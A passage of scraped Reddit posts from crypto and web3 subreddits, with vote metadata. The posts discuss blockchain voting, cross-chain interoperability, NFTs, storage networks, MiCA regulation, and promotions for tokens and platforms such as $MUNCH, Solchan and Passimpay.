disclosed, vote is private and nobody knows who citizen voted for unless citizen shares own wallet address. then proof of own vote would even be possible - if desired. 4. all miners stop activity. blockchain state is frozen to document passed election. future elections will build on top of this. &#x200b; **final thoughts** this process describes a simple to use yet secure method of voting on a blockchain. citizen would not even need to know/understand the underlying blockchain process as citizens would be guided through the process by their app and desk workers at town hall. with a suitable app design, showing only the needed buttons at the corresponding election phase, voting process would be as easy as ticking a box on a paper. with this process, i would like to understand if there are any major flaws / unaccounted risks. in my opinion, this should be a easy to implement road towards the perfect election system. let's start the discussions!",11,35,0.77,2024-01-21 09:48:37,web3,CryptoTechnology,ValFoxtrot,False,28.3
Why Is Cross-Chain Technology Required in Today's World?,"blockchain and distributed ledger networks are exploding by the day. interconnecting these new chains are becoming a necessity as more people continue to take note of the emerging technology and its capabilities. let us see how and why blockchain interoperability is important in today’s ever-changing financial markets. cross chain, technology is increasingly becoming a hot topic of discussion seen as the ultimate solution for enhancing interoperability between blockchains. in layman’s terms, cross-chain technology is an emerging technology that seeks to allow the transmission of value and information between different blockchain networks. the fact that the chains operate in isolation has mostly made it impossible for people to enjoy the full benefits of the ledger technology. the inability of different blockchains to communicate with one another has made it impossible for people to enjoy the full benefits of blockchain technology. cross-chain, technology seeks to solve all these issues, by enabling interoperability between blockchains thus making it easy for them to communicate with one another and share information without any kind of hassle. **why cross blockchain compatibility is vital?** cross-chain, the protocol ensures interoperability between blockchains, thus enabling the exchange of value as well as information between various networks. complimented with the benefits of public decentralized chains, such protocols should lay the foundation for blockchain mass adoption and use cross blockchain compatibility, allows different blockchains to communicate with one another without the help of intermediaries. what this means is that blockchains sharing similar networks will be able to transfer value between each other making it fairly easy for the investors. while in use in a business ecosystem, businesses will no longer have to contend only with clients on a network the business is built on. instead, companies will be able to transact with clients from other compatible blockchains. the entire process will take place without any downtime or expensive transaction fees. just as is the case with the internet of value, cross-blockchain compatibility will accord blockchain networks an effective means of value transmission. **who is providing cross-chain technology?** veruseum is an excellent example, in this case, it is building next-gen fast and low-cost value transfer networks. it can validate all chain transactions off-chain, unlike on-chain transactions on zk rollups. hence, it can efficiently handle complex statements over the blockchain state by hiding the linkability of senders and recipients and reducing overall communication and data stored on the ledger by compressing several transactions into a single record. ripple is another excellent example of a blockchain project trying to explore cross-chain transactions. while it is still in the early days of development, ripple is trying to make it possible for people and entities to exchange various digital assets across different blockchains. we have so many blockchains today to invest in and are spoiled by choice, but don’t you think getting them all connected to one another would be even better, rather each working in isolation. let me know your thoughts on this technology.",27,6,0.97,2021-11-10 13:46:50,web3,BlockchainStartups,PatriciaHarris_,False,28.3

imusify helps music bloggers and journalists scout new talents,"bringing a cutting-edge platform for musicians and fans to engage with no intermediary — while leveraging the blockchain space to facilitate instant payment of royalties, for example — imusify solves music bloggers’ problem. by incentivizing curators to engage to discover new content, music bloggers can spend more time discovering new music. within the blockchain space powered by imusify, every actor is rewarded with imu tokens each time they help spread the word about new music. we can further imagine music journalists and bloggers to earn imu tokens even when they share the news about a crowdfunding project, for instance. but the greatest implication for music bloggers and journalists is to identify new music and scout new talent at their fingertips, without spending days and nights looking for it. as musicians can share instantly their new work with fans, great music prs can discover “the buzz” out there, and share the news accordingly. as influencers, music bloggers can furthermore help new talents to get discovered. as active members of the music business, they are encouraged to use the platform as a networking space too, leveraging their network on the platform itself. for example, when an artist receives some support on imusify from fans (likes, shares, comments), music bloggers can support such acclaim and reshare to their network, receiving some compensation. they can also curate new music from the platform, and receive imu tokens for their participation. but wait, how can we ensure such participation remains authentic and is the true voice of music bloggers? imusify is a platform for artists, for fans, for music curators, for record labels, and for everyone in the business to find a space to share new music and monitor anything related to music content songs in a digital world. finally, with social media integration, sharing new content from imusify is made easy for bloggers. https://imusify.com",32,0,0.88,2019-05-29 00:52:34,web3,BlockchainStartups,wealthspy,False,28.0

Popular NFT Trends in the Future,"the popularity of nfts is no surprise. they're about as safe as it gets in the digital world. with nfts, a whole virtual reality can emerge, recognizing and associating things with their owners in a unique way. what can we expect from the nft space in the future? here are some of my top picks that could be some mainstream use of nfts in the future. **- logistics:** blockchain technology can be useful in the logistics industry as well, particularly because of its immutability and transparency. these aspects ensure that supply chain data remains authentic and reliable. with food, commodities, and other perishable goods, it’s important to know where they have been and for how long. an nft also has the added benefit of representing unique items. we can use an nft to track a product that contains meta-data on its origins, journey, and warehouse location. **- music:** nfts can be used in the music industry, where artists can tokenize their music. kings of leon, a famous rock band, launched their debut album as an nft, ""when you see yourself."" this could be the future of music wherein artists can create one-of-a-kind nfts as well. **- gaming:** micro-transactions and in-game purchases have created a multi-billion dollar gaming industry that could tap into nfts and blockchain technology. it's also an exciting area in terms of what an nft represents. tokens for video games combine aspects of art, collectibility, and utility for players. however, when it comes to big-budget video games, nft implementation is a long way off. vulcan forged is one of the leading gaming ecosystems in this space. with over 10+ games infused with nfts on their platform, they have some massive potential. **- finance:** nfts provide unique financial benefits too. leveraging ones nfts to either earn yields or as a loan is something that is catching up in this space. projects like drops allow users to leverage their nft assets to obtain loans and earn yield, significantly reducing the opportunity cost of holding them long-term. nftify is a simple p2p marketplace for collateralized nft loans. it allows borrowers to put up assets for a loan and lenders to make offers to lend in return for interest. staking and earning yields using your idle nfts is a great way to earn some profit. platforms like zookeeper provide much needed utility to nfts and enable users to earn some additional crypto. **- tickets:** with the wizards' team owner ted leonsis looking at using nfts for virtual tickets, we can expect this trend to catch up with other nba teams like the mavs as well. while non-fungible tokens remain misunderstood and confusing to many, a lot of boosters in the pro basketball world welcome a future where nfts are the norm. what do you think can be some other potential uses of nfts?",27,5,0.97,2021-08-30 06:53:29,web3,BlockchainStartups,PatriciaHarris_,False,27.9

🍩Why Did I Invest in $MUNCH - The #1 Charity Cross Chain Crypto-Project IMO,"$munch is a charity based crypto-project that essentially takes a portion of every transaction and redistributes it evenly between its holders and the chosen charity. i’m sure you’ve heard of these kinds of projects before, but let me tell you why $munch stands out among the rest. the main advantage of $munch has to be that it is trustless. this means that the team does not control any sort of “charity wallet”. they instead send funds directly to the chosen charities public wallet address at the point transaction. this happens automatically and without any sort of team intervention. by doing this, you can rest assured that nobody besides the charity will have access to those raised funds. this makes $munch a true charity project because it was built from the ground up with this in mind. currently the $munch tokenomics takes 5% of each transaction and sends it directly to the chosen charities wallet address, and another 5% gets redistributed amongst the holders. i know what you're thinking, “if i wanted to donate to charity, i would just do that directly myself. why would i go through $munch?” i thought a lot about this too in the beginning. i’ll be honest when i say that besides the odd $1-$2 outside of grocery stores - i did not donate to charity much at all. then $munch released something called the “hodler dashboard” on their site. it showed me exactly how much i donated as an individual and it was in the several hundreds! it blew my mind because i would never be able to do that normally. the best part was, it didn’t even feel like i had donated that amount. the game changer for me is the future plans for farming/staking. when that is introduced you will be able to allocate a % of those rewards back to charity. in this way, you can help donate directly not only through buys and sells - but simply just by holding! at this year's end i can see myself raising over $1,000 to charity on my own just by holding and farming. simply incredible; and a huge chance for people who actually want to impact the world in a positive way to do so. i am just scratching the surface here, there is a lot more nuance to $munch that you can find out about through the website [http://munchproject.io](http://munchproject.io/) or the subreddit [https://www.reddit.com/r/munchtoken/](https://www.reddit.com/r/munchtoken/) thanks for reading!",27,5,0.92,2021-07-06 14:27:07,web3,BlockchainStartups,Locifercrypto,False,27.4

"New Uses for GPUs, ASICs, and FPGAs + Serverless Frontends and Backends","a binance labs project named marlin has developed a way to increase the speed of zk proofs generation via hardware acceleration that takes the computational processing burden away from the user's device and routes it to specialized gpus, asics, and fpgas. there will be a market where individuals with compatible hardware can rent them out as zk provers. the zk provers work in tandem with another piece of tech marlin is developing called ""oyster"". oyster has a few uses. oyster enclaves the quick rundown - oyster is an open platform that allows developers to deploy custom computational tasks or services over untrusted third-party hosts. such enclaves ensure that neither the host nor any other application running in it can snoop into data or alter the integrity of computations that occur inside the tee. oyster has persistent storage, open source sdk & frameworks, monitoring and auto-scaling, https support, reproducible builds, and enables serverless deployment. in the beginning, initial implementations of oyster will be using aws nitro which will then extend to other confidential computing implementations including intel sgx and amd sev. decentralized frontends beyond the zk proofs use case, oyster enables any dapp, dao or web3 project to deploy serverless frontends on a decentralized validator network running secure enclaves via smart contracts. decentralized frontends solve the issues some projects had a couple of weeks ago where aws servers went down, taking the user interface with them. this rendered the platforms basically useless because the masses have no idea how to work with smart contracts. after oyster transitions away from aws nitro, a dex, for example, would be able have a truly decentralized and uncensorable user interface that would prevent them from suffering the same fate as tornado cash which if you remember had their frontend taken down by the feds. decentralized backends oyster allows daos to focus on their mission rather than devops. nobody has to manage authorization keys and the cost of instances is decreased by dividing them amongst users who are only charged by their personal consumption. oyster improves security as well by providing a secure execution environment for sensitive workloads via oyster enclaves. i think it's cool, but what do you sers and lady sers think?",22,11,0.97,2023-06-29 14:02:02,web3,CryptoTechnology,Scroogemcdickk,False,27.3

What Does Web3 Mean for the Future of Work?,"before i start, you can read this article here and earn 10 dao tokens: [https://www.voicedao.fun/what-does-web3-mean-for-the-future-of-work-](https://www.voicedao.fun/what-does-web3-mean-for-the-future-of-work-) (no sign up needed) &#x200b; the emergence of blockchain tech has already begun reshaping the way we look at ownership and the transfer of value. it is safe to say that as the world changes and technology progresses, the ways that we humans collaborate and create value has room to fundamentally change as well. in this article, we will learn about how web3 and daos have the potential to drastically alter the future of work. **what is web3?** if you’ve spent much time on the internet lately, you’ve surely heard of the terms cryptocurrency, nfts, and blockchain. *web3 is simply the shorthand way of referring to websites/organizations that utilize these technologies*. just like how nfts have reshaped the art and ownership world, and crypto has reshaped the way we look at money, an emerging web3 trend has already begun to change the way people collaborate, work, and start businesses – **daos**. what is a dao? a decentralized autonomous organization (dao) is a community-contribution-powered entity with no central authority. in theory, daos are designed to be governed by their individual members who democratically vote on critical decisions regarding the future of the organization, its technical specifications, and treasury allocations. the proposals for these critical decisions are usually programmed into blockchain-based smart contracts, and upon their approval by the community, are automatically integrated into the organization’s source code. members’ voting leverage is most often directly tied to the amount of native tokens they hold in their cryptocurrency wallet. these tokens, which technically represent the amount of ownership an individual has in the organization, are fully liquid and can be freely traded on a centralized/decentralized cryptocurrency exchange. the value of the token, like shares in a company, fluctuate depending on the supply and demand of the said token. how will web3 & daos change the way we work? ## freedom today, people with hard skills in development, ui/ux, graphic design, and copywriting have already begun quitting their 40-hour-per-week jobs to contribute and work for daos. instead of signing a contract that pledges their allegiance to a single company, contributors have the freedom to work on multiple different projects and choose the ones that resonate with their mission and values the most. ## fulfillment according to a recent gallup poll, around 85% of americans feel disengaged at work. this is likely because most feel as if they are repeating monotonous tasks and hold little to no stake in the actual success of their employer. with daos, as workers earn their pay, they’re also earning stake and increased voting rights in their organization. because workers have more say in the vision and future of the organization, they will feel more engaged in their work and receive the fulfillment of helping build a business/organization. ## how will it look? depending on what your skillsets are, your future workday in a dao world could look completely different. perhaps you’re passionate about entrepreneurship and will spend your time building 1 to 2 organizations from the ground up. perhaps you’re an expert on graphic design and decide to operate as a freelancer, accepting multiple jobs per week for different daos. regardless of your path, you will be earning an ownership stake and voting rights for every contribution you complete. conclusion the dao ecosystem is still extremely new – no one is exactly sure how daos will change and interact with the future of the working world. however, $11b usd has flooded into the industry since the beginning of 2021 and daos are already serving as replacements for people’s 9-5 jobs. many talented minds are already forming the basis of the infrastructure needed to make a ‘dao future’ more likely. interested in working on a dao? check out voice’s [job board](https://www.voicedao.fun/jobs) and [bounty board](https://www.voicedao.fun/bounties) to see where help is needed! hope you enjoyed the post, check out voice for more educational content: [https://www.voicedao.fun/](https://www.voicedao.fun/) you can also earn tokens while learning about web3",16,23,0.84,2022-05-02 14:11:51,web3,web3,Mk_Makanaki,False,27.200000000000003

Harmony Consensus Algorithm,"harmony uses a modified consensus algorithm called fbft, or fast byzantine fault tolerance. in this method, all validator nodes do not broadcast their votes. instead, the leader node collects the validators’ nodes through a multi-signature signing process, and then broadcasts it. the multi-signature size is o(1), which reduces the communication complexity from o(n*n) to o(n) — a humongous leap from zilliqa’s communication complexity. the validators are chosen based on a pos (proof of stake) mechanism, where nodes who wish to become validators have to stake a certain minimum number of tokens. pos is much less energy extensive than pow (proof of work), which traditional sharding-based blockchains like zilliqa use. larger the amount of tokens being staked, greater is the chance to be selected as a leader node. moreover, validators with larger stakes have a greater incentive of following the protocol and not engaging in any malicious behaviour, since any such activity will result in loss of the entire cache of staked tokens. for more details on harmony’s consensus algorithm, download the whitepaper at : https://harmony.one/",29,0,0.97,2019-04-24 18:43:27,web3,BlockchainStartups,gwen_sarah1,False,27.099999999999998

How Did My Journey to the RWA (Real World Asset Tokenization) Universe Begin?,"first of all, what is rwa? real world assets (rwa) are virtual financial products that represent real-world assets in the field of decentralized finance (defi). in other words, rwa is the on-chain representation of physical assets. tokenized assets, such as stablecoins, are the most common rwas in the cryptocurrency world. unfortunately, in countries with high inflation, income does not increase in direct proportion to expenses. this causes people to look for additional sources of income. since my retirement salary was insufficient, i started looking for additional income at this point. i turned to blockchain projects. since i did not have much funds, i started earning by participating in airdrop, social mining and testnets. i can say that i was quite successful. since rwa projects and ai projects attracted me more, i focused on these two areas. experts predict that the rwa market will reach a whopping $16 trillion by 2030. i have been involved in the social mining ilo activity of the #rwainc project, which i have examined in detail and seen potential. as i mentioned at the beginning, my country has already ranked third in the world in this activity due to the effects of high inflation. rwa inc. is transforming the financial landscape by offering a comprehensive platform for tokenizing real-world assets. it provides a tokenization service, launch platform and marketplace that allows businesses to unlock liquidity, expand market access and create value through its multi-asset advanced platform. fractional access to major investment vehicles is becoming an opportunity for small investors like me. what is social mining? crypto social mining is a win-win model where users earn rewards by actively using their social media accounts, demonstrating their personal talents and completing certain tasks. it is also a great gain for improving ourselves. i was immediately involved after rwa inc. announced the launch of its latest product, the rwa hub. this platform acts as a hub to promote knowledge, sharing, collaboration and participation in real-world asset tokenization. rwa hub launches special campaigns that are not available on other #rwa platforms. users can earn rewards, products, rwa tokens and $usdc for participating in campaigns and contributing to the ecosystem. for those who want to take a look, i'm dropping the link to the u/rwa_inc_ project below.

Filecoin vs Sia vs Storj economic values for node runners and the longevity of the network,"from what i've read so far, it seems filecoin is the cheapest out of the three ([\~$0.194667/tb/mo](https://file.app/)), compared to sia ([\~$2.50/tb/mo](https://siascan.com/)) and storj ([$4/tb/mo](https://www.storj.io/pricing)). if we look at the storage cost alone, this is a no-brainer for *the users* (assuming they're equally easy to use for now). however, for **node runners** who lend their data storage, why should they run their filecoin nodes at all? would it be *a lot* better (\~20x more incentive) to run storj nodes? my assumption regarding the economic values above reflects in each coin's current *active* nodes: * storj = [23,815](https://storjnet.info/) * sia = [459](https://siascan.com/) unfortunately, i can't find the number of the current active nodes on filecoin. there's a *total* number of the nodes that ever contacted the network, though: [1,690](https://storage.filecoin.io/). (compared to [238,222 on storj](https://stats.storjshare.io/nodes.json), and [84,978 on sia](https://siascan.com/)). i wouldn't be surprised if the number of active nodes on filecoin could be less than 100 (judging from storj and sia numbers). if the incentive differences are not enough to make people stay away from filecoin, let's look at the node's *minimum* hardware requirement for each coin: * [storj](https://docs.storj.io/node/get-started/prerequisites): 8tb of storage space per node, using 1 cpu core per node. there's no ram, gpu, etc. requirement. * [sia](https://docs.sia.tech/hosting/setting-up-hostd/linux/ubuntu#pre-requisites): a dual-core cpu, 8gb of ram, an ssd with at least 128gb of free space. nothing special here, assuming a mini pc would be sufficed. * [filecoin](https://lotus.filecoin.io/storage-providers/get-started/hardware-requirements/): 8-core cpu!, 256 gib ram + swap!, nvidia gpu with at least 11gb vram!, 2tb ssd. looking at these numbers, sure, as a miner/node runner i would want to stay away from filecoin. but even as a user, i wouldn't want to take the risk of storing my files on filecoin either, as the last 100 nodes, or so, could go away at any moment. nevertheless, there's a filecoin program called [filecoin plus](https://docs.filecoin.io/basics/how-storage-works/filecoin-plus), which incentivizes nodes to continue committing additional hard disk space to the filecoin network. according to [nft.storage](https://nft.storage), the *likelihood* of winning block rewards for node runners goes up by 10x. i don't know whether this makes any sense, as any filecoin nodes could gain up to \~20x if they switch to storj, or \~13x if they switch to sia. i am not a node runner, by the way. so, i don't know exactly about how much do nodes gain on each network. do i miss something here? what do you guys think? please let me know!",16,22,0.83,2024-02-17 03:18:25,web3,CryptoTechnology,3cue,False,26.699999999999996

Bluzelle tackles blockchain data storage problems,"“when people think of blockchain, it’s not a cure-all, but simply a ledger where you store transactional data,” mr. bains began. and as the amount of data stored on any one blockchain grows, it will slow down the network, mr. bains said. that is where bluzelle began, with a logical breakdown of the blockchain into what it actually is, namely that decentralized database. but how can that data be stored while allowing the technology to both scale and maintain maximum efficiency? bluzelle’s technology achieves such high efficiency through a unique combination of methods. swarm computing replicates data but spreads it out to geographically dispersed nodes, which protects it from area-specific disasters. when the data is accessed, bluzelle retrieves bits in parallel from the closest nodes, which reduces latency while maintaining speed. # read more here: https://nxtalpha.com/bluzelle-tackles-blockchain-data-storage-problems # website: https://bluzelle.com",28,1,0.88,2018-10-03 17:12:20,web3,BlockchainStartups,capable4uwa,False,26.0

Top Initiatives That Reward Customers for Using Their Data,"the questions of when and what data should be shared to whom and how the data owner should get credit or incentive to share their data are increasingly a matter of intense debate and research. user data is collected by different parties, for example, companies offering apps, social networking sites, and others, whose primary motive is to have enhanced business model while giving optimal services to their customers. however, the collection of user data is associated with serious privacy issues. here are some projects using blockchain technology that let you be in control of your data and also reward you for the same: 1. tapmydata: the tapmydata solution is a framework of tools, ledger and decentralized protocol for people to reclaim their digital identity, crystallize unique, verified elements of consent in an nft and provide a new, transparent channel for legitimate counterparties to blend data and exchange value. their mission is to give people control of their data and leverage collective agency in how it’s used, whether to share or get their piece of a market worth $325bn annually. 2. streamr: streamr (data) is an open source project and decentralized platform that relies on cryptography instead of trust. it is a p2p, real-time data infrastructure that houses a platform and tools for a new data economy. the technology stack includes a scalable real-time messaging network (pub/sub) hosted on computers worldwide, a marketplace for trading/selling data and a set of tools for working with real-time data. 3. vetri global: vetri is a blockchain-enabled personal data management platform putting the user back in control. they're a non-profit foundation whose mission is to make sure people earn the full value for their opinions. 4. doortoken: door is the first lead exchange powered by crypto to reward consumers. door rewards consumers every time advertisers access their data. door removes the middleman and enables a direct connection between consumers and businesses. door brings value to both the consumer and the advertiser. with door the transition of power can be put back into the consumer’s hands. consumers get paid to connect with products and services they want to buy - and the advertiser can directly connect with potential customers at a competitive price. 5. geodb: geodb describes itself as a decentralized peer-to-peer big data sharing ecosystem, which aims to return value to its creators and users. geodb’s mission is to democratize the 260b big data industry and build an open ecosystem to establish better and trusted relationships between market participants while giving back control and value to data generators, the users. geodb aims to use blockchain technology to eliminate intermediation in a huge industry and drive a faster growth an adoption. what are some of the other similar platforms you've come across?",26,1,0.99,2021-10-04 19:25:37,web3,BlockchainStartups,Wolf_Joe,False,25.9

The Impact of European MiCA Policy on Cryptocurrency Companies: Positioning and Compliance Strategies,"europe is set to become the hub of cryptocurrency the markets in crypto-assets (mica) policy, which was recently introduced by the european union, seeks to establish a new regulatory framework for cryptocurrencies. its primary objective is to increase legal transparency and promote consumer protection within the crypto market. under this policy, cryptocurrency issuers will be required to satisfy specific criteria, such as registering with a legal entity and giving detailed information to investors. the policy will also impose stringent regulations on stablecoins and asset-referenced tokens, ensuring that they are backed by high-quality assets and subject to adequate risk management. overall, the introduction of mica marks an important stride toward creating a well-defined regulatory structure for cryptocurrencies in the european union. in light of the european mica regulation, which seeks to regulate crypto assets and their service providers, there are different identity solutions that have been developed. solutions like the polygonid and the nexeraid. **polygonid:** polygon id is a solution for decentralized identity management developed on the polygon network. its primary objective is to offer individuals a secure and private way of handling their digital credentials and identities. by utilizing polygon id, users can establish a self-sovereign identity that they have complete control over, thereby eliminating their dependence on third-party institutions to verify their identity. the created identity can be utilized for a wide range of purposes, including accessing online services, signing documents, and interacting with smart contracts. one of the most notable features of polygon id is its integration of zero-knowledge (zk) proofs, which permit users to verify their identity without revealing any personal information. this is achieved by creating proof from the user's data that can be used to verify their identity while keeping sensitive information confidential. **nexeraid:** allianceblock has introduced a secure and streamlined method for digital identity verification known as nexeraid. by incorporating custodial, semi-custodial, and non-custodial wallet integration options, users can establish a smart wallet using their current web 2.0 credentials and gain access to metanfts' advantages. however, nexeraid goes beyond this by utilising existing social media accounts, email addresses, phone numbers, hardware-based authenticators, and kyc reports as verifiable credentials for authentication. with privacy-preserving zero-knowledge proofs (zkps), users have complete control over personal information sharing. for example, users can offer proof of specific credentials through zkps without disclosing any additional information, such as their age or location. alternatively, if they wish to present a plain-text proof or a digital copy of their verified documents, they may do so. the user is entirely in charge of the process. overall, nexeraid's digital identity verification solutions are tailored to the evolving landscape of web 3.0. in conclusion, the introduction of the mica policy is expected to benefit the crypto industry by providing legal clarity, a level playing field, enhanced consumer protection, and promoting innovation and development. also, with these identity solutions already in place, compliance would be easy. let me know what your thoughts on this.",15,21,0.83,2023-04-25 08:55:31,web3,CryptoTechnology,resornihgp,False,25.699999999999996

Demand and solution for utility projects !,"currently, the solana market is being ruled by meme coins and once i was part of this frenzy, i can understand the thrill, and excitement of seeing your investment double, triple, quadruple, and so on. but all these feelings of gains, underlie the feelings of fear, uncertainty, despair, and anxiety which go unnoticed but have a deep impact. moving on from the mental aspect, there’s one thing i have noticed, the call and demand for more and more utility projects and that traction/volume be shifted to utility projects from meme coins. despite knowing the boons and curses of memecoins, why are people still flocking to memecoins? is it that memecoins are more safe? is it that memecoins are more promising in the long run? the questions can keep on going but you won’t have a reasonable answer. the only answer that i can provide my own experience is the “short-term gains”. we, humans, have lost our patience levels and it’s gone to being non-existent and these can reflect in other accepts of life and it can be reflected here , your investment choices! you’re blinded by the desperation of making a quick buck you don’t realize the numerous red flags. even if you find to make it work somehow, it doesn’t stay for long! ok, enough with the hate for meme coins. i believe if we can’t completely drive off volume from memecoins and make utility projects popular on their own, maybe find a way for them to co-exist, helping one another out! one such project in recent solana times that i found interesting but couldn’t invest at early was solchat, a platform where you chat, call, and mainly send sol payments like cash app. it was a top-notch utility project and from my experience of using it was great and deserved all the praise and support. but i had invested a bit later than the early investors. so as a man of culture trying to diversify his portfolio, i stumbled upon a very interesting masterpiece! the project is called solchan. sounds familiar? well, it sure does as it’s inspired by the famous 4chan platform. for people who don’t know, 4chan is a simple image-based bulletin board where anyone can post comments and share images anonymously. so keeping the anonymity intact, solchan has upscaled their platform to not only post anonymously but to link their crypto wallets, be it phantom or solflare or any solana-supporting wallet. but what good will it do by linking a wallet? well, if your post makes it top 15 of the leaderboard which is based on interaction such as replies and the file count collectively, then you receive airdrops of the project’s native token named the same as the project which is “solchan”. despite this, they have another feature where coins can run their adverts on their ad billboard. this is where i believe we can bridge the connection between memecoins and utility and promising memecoins can use this platform to advertise their coin compared to the traditional advertising means which include callers and sol trending that only give momentum for a while and then dump instantly. these unreliable advertising strategies have a 90-95% rug rate at least in my opinion. what every project needs is reliable and diamond-handed investors and what better than to find them on the solchan platform? from my experience of using the platform, it feels like i have bonded with the people despite not knowing who they are but making sure that they are reliable investors. the scalability of this platform is unparalleled at the moment as i believe it can incorporate many more features in the future one i can provide is a live ama hosting center for coins, where rather than the traditional way of speaking, add a twist to it similar to the reddit style of amas. this is just one of the features i think they can incorporate. two updates that i got to know they are working on bang and can boost them even higher. the first one solves a problem that the team themselves noticed before any investor or user of the platform did which is rewarding the user of the post. remember i mentioned connecting your wallet to post and get airdrops by making it to the leaderboard? now that feature goes to the next level in the form of the “tipping feature”. just with the click of a button, you can tip the user of the post that has made you laugh or piqued your interest. and the second update that they are working on is their own app. an app in less than two months after launch? these lots are fast af boii! imagine getting a notification pinged to your lock screen because someone responded to your thread, or getting a happy jolt when someone tips you for your insights! the upcoming mobile app promises to keep you connected and rewarded on the go. the team which looks very promising organically growing the project from under 100k marketcap to 5m marketcap with word of mouth shows the potential of this project. they have recently inaugurated their discord server launch with the first 1000 members getting the og roles. always wanted to be first to a project like this. from what i have heard there is a mobile app also part of the future plan and much more. as a person who has blindly followed others in the past and learned the lesson the hard way, i suggest you check the project for yourself, experience the project and the community for yourself, and then invest accordingly. i believe this project has it all to touch 1b in mc but like all good things, it will take time and the fruit of patience is definitely sweet.",18,13,0.91,2024-05-06 14:05:40,web3,defi,m4r00o,False,25.1

"Cryptocurrency Payment Gateway: What It Is, How It Works, Fees","in recent years, blockchain and cryptocurrency technologies have seamlessly integrated into our everyday routines. it's now a challenge to encounter someone unfamiliar with terms like tokens, cryptocurrency exchanges, or digital currency transactions. the advancement of these technologies holds the promise of transforming conventional procedures and their utility across diverse domains. cryptocurrencies present a compelling substitute for conventional banking transactions, delivering an enhanced and more efficient payment ecosystem, courtesy of specialized technologies. in this article, we'll delve into the concept of a cryptocurrency payment gateway and elucidate its operations with the aid of real-world illustrations. ## features of the technology let's start by exploring the concept of a cryptocurrency payment gateway. to ensure the smooth operation of an exchange, it's essential to establish deep integration with various payment systems. in traditional fiat transactions, banking processing gateways are employed, and different countries often have their own distinct fiat processing systems. the same principle applies when dealing with cryptocurrency transactions. to enable functions such as accepting bitcoin payments on a website, you need to incorporate a specialized service called a cryptocurrency payment gateway. a cryptocurrency payment gateway serves as a versatile software solution and tool, primarily designed to facilitate fast and secure cryptocurrency transactions, deposits, and withdrawals. moreover, it supports various types of online transactions based on cryptocurrencies, making it a fundamental component of the cryptocurrency ecosystem. ## choosing a cryptocurrency gateway. what is important to understand in today's modern world, the realm of cryptocurrencies offers numerous options, and when making a choice, prioritizing maximum reliability and security is crucial. despite some inherent drawbacks, cryptocurrencies are actively embraced by both regular users and companies for global financial transactions. many payment systems have already adopted digital currencies, enabling users to create accounts that operate with cryptocurrencies. therefore, when selecting a cryptocurrency payment gateway, several important factors should be considered. 1. **security and reputation:** the chosen service should offer a high level of reliability and effective protection of user information and transactions. additionally, the website should be equipped with robust defenses against ddos attacks to ensure the safety of funds under all circumstances. 2. **flexibility:** the availability of a wide variety of digital currencies and access to different blockchain networks is a critical factor when choosing a service. 3. **legitimacy:** it is essential that the company holds the necessary licenses to make its operations legal and provide assurance of customer safety. 4. **convenience:** low commission fees and high-speed data processing enhance the convenience of transactions for users, enabling instant transfers on a global scale. 5. **user-friendly website:** an intuitive design and multilingual functionality contribute to making cryptocurrency transactions as user-friendly as possible. 6. **anonymity and transparency:** transaction data should be accessible and adhere to legal standards, while the service should also guarantee user privacy. 7. **independence:** transactions between the company and users should not involve third parties, ensuring that payments are fast, secure, and confidential. ## how cryptocurrency payment gateway works a cryptocurrency payment gateway is a technological solution that facilitates the interaction between internet users and the cryptocurrency network, enabling them to conduct transactions using cryptocurrencies. let's explore how this process functions in more detail: 1. **initiation of the transaction:** when a user decides to make a payment with cryptocurrency, they select this payment method during an online transaction, which could involve purchasing goods, paying for services, transferring funds, and more. 2. **interaction with the gateway:** transaction details are transmitted to the cryptocurrency payment gateway, acting as an intermediary between the user and the cryptocurrency network. the gateway processes the request and manages the subsequent stages of the transaction. 3. **transaction processing:** the cryptocurrency payment gateway verifies the transaction. it checks that the transaction details are accurate, confirms the availability of sufficient funds in the user's account, and ensures that all other parameters meet the necessary requirements. if there are any violations or errors, the transaction may be declined. 4. **cryptocurrency transfer:** following successful verification, the gateway initiates the transfer of funds from the user's wallet to the wallet of the merchant or recipient. this process takes place within the blockchain of the chosen cryptocurrency and is recorded in blocks, guaranteeing transparency and security. 5. **transaction completion:** once the transaction is finalized, both the user and the merchant or recipient receive notifications of a successful payment. the order is considered paid, and goods or services can be provided accordingly. integrating a cryptocurrency payment gateway into an online business or e-commerce store offers several advantages, including the expansion of payment options, reaching a global customer base, and enhancing the security and transparency of financial transactions. this empowers businesses to remain competitive and meet the demands of modern consumers. ## types of fees and costs the commission for funding your passimpay account is set at 0%, ensuring that you can deposit any amount in any of the supported cryptocurrencies without incurring additional fees or charges. business accounts may have a withdrawal fee, but it will not exceed 3.5%. recognizing that every business has its unique characteristics, our pricing policy is tailored to each partner's specific needs. we are open to discussing the particulars and providing advantageous terms for all parties involved. at passimpay, all transactions are executed automatically, enabling us to instantly process your deposits and withdrawals. our operations are completed in a matter of seconds, ensuring swift and efficient service. ## factors influencing fees in a cryptocurrency gateway several factors can influence the fees associated with processing payments through cryptocurrency payment gateways, and these factors include the following: 1. **cryptocurrency selection**: various cryptocurrencies may have distinct processing fees. for instance, well-known cryptocurrencies like bitcoin or ethereum might entail higher fees compared to less popular alternatives. notably, passimpay offers the opportunity to reduce fees when using btc by consolidating multiple transactions. 2. **transaction volume**: the overall volume of payments processed through the gateway can impact the cost of service. 3. **gateway fee structure**: each payment gateway operates with its fee structure and commissions. these charges can encompass transaction fees, monthly payments, and a percentage of the total transaction volume. 4. **security measures**: a high level of security provided by the gateway may result in increased payment processing costs due to additional anti-fraud and security measures. 5. **gateway specifics**: different cryptocurrency gateways may offer distinct payment structures and service conditions. the choice of a particular gateway can significantly influence overall expenses. 6. **geographical variation**: some gateways may provide varying rates based on your company's geographic location or target audience. these factors can exert different degrees of influence on the cost of processing payments through cryptocurrency gateways. it is advisable to carefully consider these aspects when selecting the optimal gateway for your business. ## conclusion the significance of cryptocurrency payment gateways in advancing the cryptocurrency ecosystem cryptocurrency payment gateways are pivotal in advancing the cryptocurrency ecosystem, offering both businesses and individuals the means to seamlessly incorporate cryptocurrencies into their financial activities. these gateways streamline the use of cryptocurrencies in daily transactions and broaden their utility. moreover, they bolster security measures within cryptocurrency payment processing and present a range of gateway options tailored to diverse business or personal requirements. these collective aspects establish cryptocurrency payment gateways as an indispensable component of the contemporary cryptocurrency landscape, fostering increased adoption and integration of cryptocurrencies within the global economy.",25,0,1.0,2023-09-30 16:11:36,web3,BlockchainStartups,Passimpay,False,25.0
